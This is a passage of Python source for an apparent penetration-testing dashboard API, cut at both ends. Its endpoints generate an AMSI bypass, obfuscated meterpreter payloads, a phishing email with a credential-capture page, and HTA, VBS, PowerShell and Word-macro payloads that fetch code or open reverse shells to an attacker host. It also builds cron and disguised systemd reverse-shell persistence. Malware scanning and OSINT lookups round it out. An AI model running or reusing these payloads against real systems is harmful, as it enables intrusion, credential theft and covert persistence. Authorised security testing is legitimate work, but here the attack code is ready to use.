            "detail": "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        },
    ]
    return {"scan_id": scan_id, "target": req.target, "findings": techniques,
            "raw_output": "\n".join(t["detail"] for t in techniques),
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(techniques)} AMSI bypass techniques"}


@app.post("/api/av/obfuscate")
async def av_obfuscate(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    lhost = opts.get("lhost", "10.10.10.10")
    lport = opts.get("lport", 4444)
    out_path = "/tmp/payload_obf.exe"
    result = await run_tool(
        ["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp",
         f"LHOST={lhost}", f"LPORT={lport}",
         "-e", "x64/xor_dynamic", "-i", "3", "-f", "exe", "-o", out_path],
        timeout=60
    )
    raw = result["output"] + result.get("error","")
    file_size = os.path.getsize(out_path) if os.path.exists(out_path) else 0
    findings = [
        {"severity": "HIGH", "title": "Obfuscated Payload Generated", "detail": f"Path: {out_path}, Size: {file_size} bytes"},
        {"severity": "INFO", "title": "Encoder Used", "detail": "x64/xor_dynamic x3 iterations"},
    ]
    if result.get("error",""):
        findings.append({"severity": "MEDIUM", "title": "msfvenom stderr", "detail": result.get("error","")[:200]})
    return {"scan_id": scan_id, "target": lhost, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "message": f"Payload at {out_path} ({file_size} bytes)"}


# ─────────────────────────────────────────────────────────────
# SOCIAL ENGINEERING
# ─────────────────────────────────────────────────────────────

@app.post("/api/se/phishing")
async def se_phishing(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    org_name = opts.get("org_name", "Target Corp")
    lhost = opts.get("lhost", "10.10.10.10")
    _parsed = urlparse(req.target if "://" in req.target else f"http://{req.target}")
    _domain = _parsed.hostname or req.target
    email_template = (
        f"From: IT Support <noreply@{_domain}>\n"
        f"Subject: Urgent: Password Reset Required — {org_name}\n\n"
        f"Dear Employee,\n\nWe have detected unusual activity on your {org_name} account.\n"
        f"Please verify your credentials immediately:\n\nhttp://{lhost}/login\n\n"
        f"Failure to comply within 24 hours will result in account suspension.\n\n"
        f"Regards,\n{org_name} IT Security Team"
    )
    landing_page = (
        f"<!DOCTYPE html><html><head><title>{org_name} Login</title></head><body>"
        f"<h2>{org_name} — Secure Login</h2>"
        f"<form method='POST' action='http://{lhost}/capture'>"
        f"<input name='username' placeholder='Username'><br>"
        f"<input type='password' name='password' placeholder='Password'><br>"
        f"<button type='submit'>Login</button></form></body></html>"
    )
    setup_commands = (
        f"# Start credential capture server:\n"
        f"python3 -m http.server 80 --directory /tmp/phish\n"
        f"# Or use SET:\nsetoolkit"
    )
    findings = [
        {"severity": "HIGH", "title": "Phishing Email Template", "detail": email_template[:300]},
        {"severity": "HIGH", "title": "Landing Page HTML", "detail": landing_page[:300]},
        {"severity": "INFO", "title": "Setup Commands", "detail": setup_commands},
    ]
    return {"scan_id": scan_id, "target": req.target, "findings": findings,
            "raw_output": email_template + "\n---\n" + landing_page,
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "message": "Phishing kit generated",
            "email_template": email_template, "landing_page_html": landing_page,
            "setup_commands": setup_commands}


@app.post("/api/se/clone")
async def se_clone(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    clone_dir = f"/tmp/clone_{scan_id[:8]}"
    result = await run_tool(
        ["wget", "--mirror", "--convert-links", "--no-check-certificate",
         req.target, "-P", clone_dir],
        timeout=60
    )
    raw = result["output"] + result.get("error","")
    exists = os.path.isdir(clone_dir)
    findings = [
        {"severity": "INFO" if exists else "MEDIUM",
         "title": "Clone " + ("Successful" if exists else "Failed"),
         "detail": f"Output directory: {clone_dir}"},
    ]
    if exists:
        try:
            count = sum(len(files) for _, _, files in os.walk(clone_dir))
            findings.append({"severity": "INFO", "title": "Files Cloned", "detail": f"{count} file(s) in {clone_dir}"})
        except Exception:
            pass
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"Clone at {clone_dir}"}


@app.post("/api/se/set_launcher")
async def se_set_launcher(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    lhost = opts.get("lhost", "10.10.10.10")
    config = (
        "# SET Credential Harvester Config\n"
        "1  # Social Engineering Attacks\n"
        "2  # Website Attack Vectors\n"
        "3  # Credential Harvester Attack\n"
        "2  # Site Cloner\n"
        f"# Enter IP: {lhost}\n"
        f"# Enter URL to clone: http://{req.target}\n"
    )
    commands = f"sudo setoolkit\n# Follow menu:\n{config}\n# Credentials saved to /var/www/harvester_*.txt"
    findings = [
        {"severity": "HIGH", "title": "SET Credential Harvester", "detail": config},
        {"severity": "INFO", "title": "Launch Command", "detail": "sudo setoolkit"},
        {"severity": "INFO", "title": "Output", "detail": "Credentials saved to /var/www/harvester_*.txt"},
    ]
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": commands,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "SET config generated"}


@app.post("/api/se/payload_delivery")
async def se_payload_delivery(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    lhost = opts.get("lhost", "10.10.10.10")
    lport = opts.get("lport", 4444)
    method = opts.get("method", "ps1")
    payloads = {
        "hta": (
            f'<html><head><script language="VBScript">\n'
            f'Set o=CreateObject("WScript.Shell")\n'
            f'o.Run "powershell -nop -w hidden -e <BASE64_PAYLOAD>",0\n'
            f'</script></head></html>\n'
            f'# Deliver: python3 -m http.server 80; send link to victim'
        ),
        "vbs": (
            f'Set shell = CreateObject("WScript.Shell")\n'
            f'shell.Run "powershell -c \\"IEX(New-Object Net.WebClient).DownloadString(\'http://{lhost}/shell.ps1\')\\"",0,False\n'
            f'# Deliver via email attachment or USB'
        ),
        "ps1": (
            f'$c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});\n'
            f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};\n'
            f'while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);\n'
            f'$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+">";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}}\n'
            f'# Deliver: IEX(New-Object Net.WebClient).DownloadString("http://{lhost}/shell.ps1")'
        ),
        "doc": (
            f'Sub AutoOpen()\n'
            f'    Shell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://{lhost}/shell.ps1\')"\n'
            f'End Sub\n'
            f'# Embed in DOCX: Developer > Macros > Insert above > Save as .docm'
        ),
    }
    payload_code = payloads.get(method, payloads["ps1"])
    findings = [
        {"severity": "CRITICAL", "title": f"Payload ({method.upper()})", "detail": payload_code[:400]},
        {"severity": "HIGH", "title": "Listener", "detail": f"nc -lvnp {lport}  OR  msfconsole -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'"},
    ]
    return {"scan_id": scan_id, "target": lhost, "findings": findings, "raw_output": payload_code,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{method.upper()} payload generated"}


# ─────────────────────────────────────────────────────────────
# MALWARE ANALYSIS
# ─────────────────────────────────────────────────────────────

@app.post("/api/malware/static")
async def malware_static(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    filepath = opts.get("filepath", req.target)
    r1 = await run_tool(["file", filepath], timeout=10)
    r2 = await run_tool(["sh", "-c", f"strings '{filepath}' | head -100"], timeout=15)
    r3 = await run_tool(["sha256sum", filepath], timeout=10)
    r4 = await run_tool(["objdump", "-f", filepath], timeout=10)
    r5 = await run_tool(["binwalk", filepath], timeout=20)
    raw = "\n".join([r1["output"], r2["output"], r3["output"], r4["output"], r5["output"]])
    findings = []
    ft = r1["output"].strip()
    if ft:
        findings.append({"severity": "INFO", "title": "File Type", "detail": ft})
    sha = r3["output"].split()[0] if r3["output"].strip() else "N/A"
    findings.append({"severity": "INFO", "title": "SHA256", "detail": sha})
    for s in r2["output"].splitlines():
        sl = s.lower()
        if any(k in sl for k in ["http", "cmd", "powershell", "exec", "shell", "download"]):
            findings.append({"severity": "HIGH", "title": "Suspicious String", "detail": s.strip()})
    for line in r5["output"].splitlines():
        if "executable" in line.lower() or "archive" in line.lower():
            findings.append({"severity": "MEDIUM", "title": "Binwalk Match", "detail": line.strip()})
    return {"scan_id": scan_id, "target": filepath, "findings": findings, "raw_output": raw[:3000],
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} static findings"}


@app.post("/api/malware/yara")
async def malware_yara(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    filepath = opts.get("filepath", req.target)
    rules_path = opts.get("rules_path", "/usr/share/yara-rules/")
    result = await run_tool(["yara", "-r", rules_path, filepath], timeout=60)
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        line = line.strip()
        if line and not line.startswith("error"):
            sev = "CRITICAL" if any(w in line.lower() for w in ["trojan", "rat", "ransom", "backdoor"]) else "HIGH"
            findings.append({"severity": sev, "title": "YARA Match", "detail": line})
        elif "error" in line.lower():
            findings.append({"severity": "INFO", "title": "YARA Error", "detail": line})
    if not findings:
        findings.append({"severity": "INFO", "title": "No YARA matches", "detail": raw[:300]})
    return {"scan_id": scan_id, "target": filepath, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} YARA match(es)"}


@app.post("/api/malware/hash_lookup")
async def malware_hash_lookup(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    filepath = opts.get("filepath", req.target)
    r_md5 = await run_tool(["md5sum", filepath], timeout=10)
    r_sha1 = await run_tool(["sha1sum", filepath], timeout=10)
    r_sha256 = await run_tool(["sha256sum", filepath], timeout=10)
    md5 = r_md5["output"].split()[0] if r_md5["output"].strip() else "N/A"
    sha1 = r_sha1["output"].split()[0] if r_sha1["output"].strip() else "N/A"
    sha256 = r_sha256["output"].split()[0] if r_sha256["output"].strip() else "N/A"
    vt_url = f"https://www.virustotal.com/gui/file/{sha256}"
    findings = [
        {"severity": "INFO", "title": "MD5", "detail": md5},
        {"severity": "INFO", "title": "SHA1", "detail": sha1},
        {"severity": "INFO", "title": "SHA256", "detail": sha256},
        {"severity": "INFO", "title": "VirusTotal Lookup URL", "detail": vt_url},
    ]
    raw = f"MD5: {md5}\nSHA1: {sha1}\nSHA256: {sha256}\nVT: {vt_url}"
    return {"scan_id": scan_id, "target": filepath, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Hashes computed"}


@app.post("/api/malware/strings")
async def malware_strings(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    filepath = opts.get("filepath", req.target)
    result = await run_tool(
        ["sh", "-c",
         f"strings -n 6 '{filepath}' | grep -iE 'http|ftp|password|key|secret|cmd|powershell|base64|eval'"],
        timeout=30
    )
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        ll = line.lower()
        if any(k in ll for k in ["password", "secret", "key", "base64", "eval"]):
            findings.append({"severity": "HIGH", "title": "Sensitive String", "detail": line.strip()})
        elif any(k in ll for k in ["http", "ftp", "cmd", "powershell"]):
            findings.append({"severity": "MEDIUM", "title": "Network/Exec String", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "No suspicious strings", "detail": raw[:300]})
    return {"scan_id": scan_id, "target": filepath, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} suspicious string(s)"}


# ─────────────────────────────────────────────────────────────
# SUPPLY CHAIN
# ─────────────────────────────────────────────────────────────

@app.post("/api/supply/npm_audit")
async def supply_npm_audit(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    path = opts.get("path", req.target)
    audit_type = opts.get("type", "npm")
    if audit_type == "npm":
        result = await run_tool(["npm", "audit", "--json"], timeout=60)
    else:
        result = await run_tool(["pip-audit", "--format", "json", "--path", path], timeout=60)
    raw = result["output"] + result.get("error","")
    findings = []
    try:
        data = json.loads(result["output"])
        vulns = data.get("vulnerabilities", data.get("vulnerabilities", {}))
        if isinstance(vulns, dict):
            for name, info in vulns.items():
                sev = info.get("severity", "MEDIUM").upper()
                findings.append({"severity": sev, "title": f"Vulnerable Package: {name}",
                                 "detail": str(info.get("via", info))[:200]})
        elif isinstance(vulns, list):
            for v in vulns:
                sev = v.get("severity", "MEDIUM").upper() if isinstance(v, dict) else "MEDIUM"
                findings.append({"severity": sev, "title": "Vulnerability", "detail": str(v)[:200]})
    except Exception:
        for line in raw.splitlines():
            if "critical" in line.lower() or "high" in line.lower():
                findings.append({"severity": "HIGH", "title": "Audit Finding", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "Audit complete", "detail": raw[:300]})
    return {"scan_id": scan_id, "target": path, "findings": findings, "raw_output": raw[:2000],
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} vuln(s) found"}


@app.post("/api/supply/confusion")
async def supply_confusion(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    packages = opts.get("packages", [req.target])
    findings = []
    raw_parts = []
    for pkg in packages:
        result = await run_tool(
            ["pip", "download", pkg, "--no-deps", "-d", "/tmp/pkgcheck"],
            timeout=30
        )
        raw = result["output"] + result.get("error","")
        raw_parts.append(f"[{pkg}]\n{raw}")
        if "successfully downloaded" in raw.lower() or "saved" in raw.lower():
            findings.append({"severity": "HIGH", "title": f"Package Downloadable: {pkg}",
                             "detail": "Package exists on PyPI — potential confusion risk if internal"})
        elif "no matching" in raw.lower() or "not found" in raw.lower():
            findings.append({"severity": "INFO", "title": f"Package Not Found: {pkg}",
                             "detail": "Not on PyPI — safe from public confusion"})
        else:
            findings.append({"severity": "MEDIUM", "title": f"Check Result: {pkg}", "detail": raw[:200]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": "\n".join(raw_parts),
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(packages)} package(s) checked"}


@app.post("/api/supply/sbom")
async def supply_sbom(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    scan_path = opts.get("path", req.target)
    manifest_files = ["package.json", "requirements.txt", "Gemfile", "go.mod", "pom.xml",
                      "Cargo.toml", "composer.json", "yarn.lock"]
    findings = []
    raw_parts = []
    for mf in manifest_files:
        full = os.path.join(scan_path, mf)
        if os.path.exists(full):
            try:
                with open(full, "r", errors="ignore") as f:
                    content = f.read(2000)
                raw_parts.append(f"=== {mf} ===\n{content}")
                dep_count = content.count("\n")
                findings.append({"severity": "INFO", "title": f"Manifest: {mf}",
                                 "detail": f"Found at {full} (~{dep_count} lines)"})
                if "lodash" in content.lower() or "log4j" in content.lower():
                    findings.append({"severity": "HIGH", "title": f"Known Risky Dep in {mf}",
                                     "detail": "lodash/log4j detected — verify version"})
            except Exception as e:
                findings.append({"severity": "INFO", "title": f"Could not read {mf}", "detail": str(e)})
    if not findings:
        findings.append({"severity": "INFO", "title": "No manifest files found", "detail": f"Scanned: {scan_path}"})
    return {"scan_id": scan_id, "target": scan_path, "findings": findings, "raw_output": "\n".join(raw_parts)[:3000],
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} SBOM entry(ies)"}


# ─────────────────────────────────────────────────────────────
# ADVANCED PERSISTENCE
# ─────────────────────────────────────────────────────────────

@app.post("/api/persist/install_cron")
async def persist_install_cron(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    lhost = opts.get("lhost", "10.10.10.10")
    lport = opts.get("lport", 4444)
    interval = opts.get("interval", "*/5 * * * *")
    shell_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    cron_line = f"{interval} root {shell_cmd}"
    payload_path = "/tmp/cron_payload"
    payload = f"# Cron persistence payload (review before use)\n# Add to /etc/crontab:\n{cron_line}\n"
    try:
        with open(payload_path, "w") as f:
            f.write(payload)
        written = True
    except Exception:
        written = False
    install_cmd = f"echo '{cron_line}' >> /etc/crontab"
    findings = [
        {"severity": "CRITICAL", "title": "Cron Payload (NOT installed)", "detail": cron_line},
        {"severity": "HIGH", "title": "Install Command (manual)", "detail": install_cmd},
        {"severity": "INFO", "title": "Payload Written To", "detail": payload_path if written else "Write failed"},
    ]
    return {"scan_id": scan_id, "target": lhost, "findings": findings, "raw_output": payload,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Cron payload generated (not installed)"}


@app.post("/api/persist/install_service")
async def persist_install_service(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    lhost = opts.get("lhost", "10.10.10.10")
    lport = opts.get("lport", 4444)
    svc_name = "systemd-network-helper"
    svc_content = (
        f"[Unit]\nDescription=Network Helper Service\nAfter=network.target\n\n"
        f"[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\n"
        f"Restart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\n"
    )
    install_cmds = (
        f"cp {svc_name}.service /etc/systemd/system/\n"
        f"systemctl daemon-reload\n"
        f"systemctl enable {svc_name}\n"
        f"systemctl start {svc_name}"
    )
    findings = [
        {"severity": "CRITICAL", "title": "Systemd Service File", "detail": svc_content},
        {"severity": "HIGH", "title": "Install Commands", "detail": install_cmds},
        {"severity": "INFO", "title": "Service Name", "detail": svc_name},
    ]
    return {"scan_id": scan_id, "target": lhost, "findings": findings,
            "raw_output": svc_content + "\n" + install_cmds,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Systemd persistence service generated"}


@app.post("/api/persist/rootkit_scan")
async def persist_rootkit_scan(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    r1 = await run_tool(
        ["sh", "-c", "rkhunter --check --skip-keypress 2>/dev/null | tail -50"],
        timeout=120
    )
    r2 = await run_tool(
        ["sh", "-c", "chkrootkit 2>/dev/null | grep -i INFECTED"],
        timeout=60
    )
    raw = r1["output"] + r1["error"] + "\n" + r2["output"] + r2["error"]
    findings = []
    for line in raw.splitlines():
        ll = line.lower()
        if "infected" in ll or "warning" in ll:
            findings.append({"severity": "CRITICAL", "title": "Rootkit Indicator", "detail": line.strip()})
        elif "not found" in ll and "rkhunter" not in ll:
            findings.append({"severity": "MEDIUM", "title": "Suspicious File Missing", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "No rootkit indicators", "detail": raw[:400]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} rootkit indicator(s)"}


@app.post("/api/persist/check_indicators")
async def persist_check_indicators(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    cmd = (
        "crontab -l 2>/dev/null; "
        "find /etc/systemd/system -newer /tmp -name '*.service' 2>/dev/null; "
        "grep -v '^#' ~/.bashrc 2>/dev/null | grep -v '^$'; "
        "grep -v '^#' ~/.profile 2>/dev/null | grep -v '^$'; "
        "cat /etc/rc.local 2>/dev/null; "
        "find / -perm -4000 -newer /etc/passwd -type f 2>/dev/null; "
        "awk -F: '$3==0{print $1}' /etc/passwd; "
        "cat ~/.ssh/authorized_keys 2>/dev/null"
    )
    result = await run_tool(["sh", "-c", cmd], timeout=30)
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        ll = line.strip().lower()
        if not ll:
            continue
        if "ssh-rsa" in ll or "ssh-ed25519" in ll or "authorized_keys" in ll:
            findings.append({"severity": "CRITICAL", "title": "SSH Authorized Key", "detail": line.strip()})
        elif ".service" in ll:
            findings.append({"severity": "HIGH", "title": "New Systemd Service (last 7d)", "detail": line.strip()})
        elif re.search(r'\*.*\*', ll):
            findings.append({"severity": "HIGH", "title": "Cron Entry", "detail": line.strip()})
        elif "export" in ll or "alias" in ll or "curl" in ll or "wget" in ll:
            findings.append({"severity": "MEDIUM", "title": "Suspicious Shell Config", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "No persistence indicators", "detail": raw[:400]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} persistence IoC(s)"}


# ─────────────────────────────────────────────────────────────
# OSINT
# ─────────────────────────────────────────────────────────────

@app.post("/api/osint/spiderfoot")
async def osint_spiderfoot(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    result = await run_tool(
        ["spiderfoot", "-s", req.target,
         "-m", "sfp_dnsresolve,sfp_whois,sfp_shodan,sfp_portscan_tcp",
         "-o", "csv", "-q"],
        timeout=120
    )
    raw = result["output"] + result.get("error","")
    findings = []
    if "not found" in raw.lower() or "no such file" in raw.lower():
        findings.append({"severity": "INFO", "title": "SpiderFoot Not Found",
                         "detail": "Launch SpiderFoot web UI: spiderfoot -l 127.0.0.1:5001"})
    else:
        for line in raw.splitlines():
            if "," in line and len(line) > 20:
                parts = line.split(",", 2)
                findings.append({"severity": "INFO", "title": f"OSINT: {parts[0].strip()}",
                                 "detail": parts[-1].strip()[:200]})
            if len(findings) >= 40:
                break
    if not findings:
        findings.append({"severity": "INFO", "title": "SpiderFoot output", "detail": raw[:400]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} OSINT record(s)"}


@app.post("/api/osint/recon_ng")
async def osint_recon_ng(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    host = _recon_host(req.target) if req.target else req.target
    findings = []
    raw_parts = []

    # DNS standard enumeration (A, MX, NS, TXT, SOA)
    r1 = await run_tool(["dnsrecon", "-d", host, "-t", "std"], timeout=60)
    raw1 = r1["output"] + r1.get("error", "")
    raw_parts.append(raw1)
    for line in raw1.splitlines():
        line = line.strip()
        if re.search(r'\[\+\]|\[\*\]', line):
            m = re.search(r'\b(A|MX|NS|TXT|SOA|CNAME)\b.*?(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[\w\.-]+\.\w{2,})', line)
            if m:
                rec_type = m.group(1)
                detail = line.replace("[+]","").replace("[*]","").strip()
                sev = "HIGH" if rec_type == "MX" else "MEDIUM" if rec_type in ("A","NS") else "INFO"
                findings.append({"severity": sev, "title": f"DNS {rec_type} Record", "detail": detail[:120]})

    # WHOIS lookup
    r2 = await run_tool(["whois", host], timeout=30)
    raw2 = r2["output"] + r2.get("error","")
    raw_parts.append(raw2)
    for line in raw2.splitlines():
        l = line.lower()
        if any(k in l for k in ["registrar:", "creation date:", "expiry date:", "name server:", "registrant"]):
            val = line.strip()
            if len(val) > 5:
                title = line.split(":")[0].strip().title()
                findings.append({"severity": "INFO", "title": f"WHOIS: {title}", "detail": val[:120]})

    # Subdomain cert transparency via crt.sh
    r3 = await run_tool(
        ["curl", "-s", f"https://crt.sh/?q=%25.{host}&output=json"],
        timeout=30
    )
    raw3 = r3["output"]
    if raw3 and "[" in raw3:
        try:
            import json as _json
            certs = _json.loads(raw3)
            seen = set()
            for c in certs[:30]:
                name = c.get("name_value","").replace("*.","").strip()
                for n in name.split("\n"):
                    n = n.strip()
                    if n and host in n and n not in seen:
                        seen.add(n)
                        findings.append({"severity": "MEDIUM", "title": "Subdomain (cert transparency)", "detail": n})
        except Exception:
            pass

    raw = "\n".join(raw_parts)
    if not findings:
        findings.append({"severity": "INFO", "title": "No hosts found", "detail": "No DNS records or subdomains discovered for this target."})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw[:800],
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} host(s) found"}


def _api_get(url, headers=None, timeout=15):
    """Simple HTTPS GET → parsed JSON or None."""
    try:
        ctx = _ssl.create_default_context()
        req2 = urllib.request.Request(url, headers=headers or {"User-Agent":"OSCP-Dashboard/1.0"})
        with urllib.request.urlopen(req2, timeout=timeout, context=ctx) as r:
            return json.loads(r.read().decode())
    except Exception:
        return None

@app.post("/api/osint/email_osint")
async def osint_email_osint(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    domain = _recon_host(req.target) if req.target else req.target
    findings = []
    seen = set()

    def add(sev, title, detail):
        key = f"{title}:{detail}"
        if key not in seen:
            seen.add(key)
            findings.append({"severity": sev, "title": title, "detail": str(detail)[:200]})

    # ── 1. theHarvester (free sources only) ──────────────────────
    result = await run_tool(
        ["theHarvester", "-d", domain, "-b",
         "crtsh,dnsdumpster,hackertarget,anubis,certspotter,rapiddns,otx,urlscan",
         "-l", "200"], timeout=120)
    raw = result["output"] + result.get("error","")
    for line in raw.splitlines():
        line = line.strip()
        if re.match(r'^[\w\.\+\-]+@[\w\.-]+\.\w{2,}$', line):
            add("HIGH", "Email Found", line)
        elif "linkedin.com/in/" in line.lower():
            add("MEDIUM", "LinkedIn Profile", line)
        elif re.match(r'^\d{1,3}(\.\d{1,3}){3}$', line):
            add("MEDIUM", "IP Address", line)
        elif re.match(r'^[\w\-]+\.[\w\.-]+\.[a-z]{2,}$', line) and domain.split(".")[-2] in line:
            add("MEDIUM", "Subdomain", line)

    # ── 2. Hunter.io — email finder ───────────────────────────────
    if HUNTER_KEY:
        data = _api_get(f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={HUNTER_KEY}&limit=20")
        if data and data.get("data"):
            org = data["data"].get("organization","")
            if org: add("INFO", "Organisation", org)
            for e in data["data"].get("emails",[]):
                add("HIGH", "Email Found (Hunter.io)", e.get("value",""))
                if e.get("first_name") or e.get("last_name"):
                    add("INFO", "Person", f"{e.get('first_name','')} {e.get('last_name','')} — {e.get('position','')}")

    # ── 3. Shodan — open ports / banner grabbing ──────────────────
    if SHODAN_KEY:
        data = _api_get(f"https://api.shodan.io/dns/resolve?hostnames={domain}&key={SHODAN_KEY}")
        ip = data.get(domain) if data else None
        if ip:
            add("MEDIUM", "IP (Shodan DNS)", ip)
            host_data = _api_get(f"https://api.shodan.io/shodan/host/{ip}?key={SHODAN_KEY}")
            if host_data:
                org = host_data.get("org","")
                isp = host_data.get("isp","")
                country = host_data.get("country_name","")
                if org: add("INFO", "Organisation (Shodan)", f"{org} — ISP: {isp} — {country}")
                for s in host_data.get("data",[])[:10]:
                    port = s.get("port","")
                    prod = s.get("product","") or s.get("transport","")
                    banner = s.get("data","")[:80]
                    sev = "HIGH" if port in (21,22,23,3306,5432,6379,27017) else "MEDIUM"
                    add(sev, f"Open Port {port}/{prod}", banner.strip())
                vulns = host_data.get("vulns",{})
                for cve in list(vulns.keys())[:5]:
                    add("CRITICAL", f"CVE: {cve}", f"Shodan confirmed vulnerability on {domain}")

    # ── 4. VirusTotal — passive DNS + reputation ─────────────────
    if VIRUSTOTAL_KEY:
        data = _api_get(f"https://www.virustotal.com/api/v3/domains/{domain}",
                        headers={"x-apikey": VIRUSTOTAL_KEY, "User-Agent":"OSCP-Dashboard/1.0"})
        if data and data.get("data"):
            attrs = data["data"].get("attributes",{})
            rep = attrs.get("reputation", 0)
            cats = attrs.get("categories",{})
            malicious = attrs.get("last_analysis_stats",{}).get("malicious",0)
            if malicious > 0:
                add("HIGH", "Malicious (VirusTotal)", f"{malicious} engines flagged {domain} as malicious")
            elif rep < -10:
                add("MEDIUM", "Low Reputation (VirusTotal)", f"Reputation score: {rep}")
            else:
                add("INFO", "VirusTotal Reputation", f"Score: {rep} | Categories: {', '.join(set(cats.values()))[:80]}")
            for rec in attrs.get("last_dns_records",[])[:8]:
                add("INFO", f"DNS {rec.get('type','')} Record", rec.get("value","")[:100])

    # ── 5. SecurityTrails — subdomains ────────────────────────────
    if SECTRAILS_KEY:
        data = _api_get(f"https://api.securitytrails.com/v1/domain/{domain}/subdomains",
                        headers={"apikey": SECTRAILS_KEY, "User-Agent":"OSCP-Dashboard/1.0"})
        if data and data.get("subdomains"):
            for sub in data["subdomains"][:20]:
                add("MEDIUM", "Subdomain (SecurityTrails)", f"{sub}.{domain}")

    # ── 6. HaveIBeenPwned — breach check ─────────────────────────
    if HIBP_KEY:
        data = _api_get(f"https://haveibeenpwned.com/api/v3/breacheddomain/{domain}",
                        headers={"hibp-api-key": HIBP_KEY, "User-Agent":"OSCP-Dashboard/1.0"})
        if data:
            for email, breaches in (data.items() if isinstance(data, dict) else []):
                add("CRITICAL", "Breached Email (HIBP)", f"{email} found in: {', '.join(breaches[:3])}")

    # ── 7. crt.sh subdomains (always free) ───────────────────────
    data = _api_get(f"https://crt.sh/?q=%25.{domain}&output=json")
    if data and isinstance(data, list):
        for c in data[:40]:
            for n in c.get("name_value","").split("\n"):
                n = n.replace("*.","").strip()
                if n and domain in n:
                    add("MEDIUM", "Subdomain (crt.sh)", n)

    if not findings:
        findings.append({"severity": "INFO", "title": "No OSINT data found",
                         "detail": "Add API keys (Shodan, Hunter.io, VirusTotal) in Settings for deeper results."})
